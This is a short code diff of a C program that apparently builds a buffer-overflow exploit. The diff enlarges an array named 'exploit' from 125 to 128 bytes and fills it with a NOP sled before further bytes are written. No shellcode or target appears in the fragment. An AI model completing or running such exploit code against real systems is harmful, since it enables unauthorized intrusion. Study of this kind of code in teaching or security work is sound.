@@ -14,10 +14,10 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
-	char exploit[125];
+	char exploit[128];
 	
 	int i=0;
-	for(i=0;i<125;i++){
+	for(i=0;i<128;i++){
 		exploit[i] = NOP;
 	}
 	for(i=75;i<120;i++){
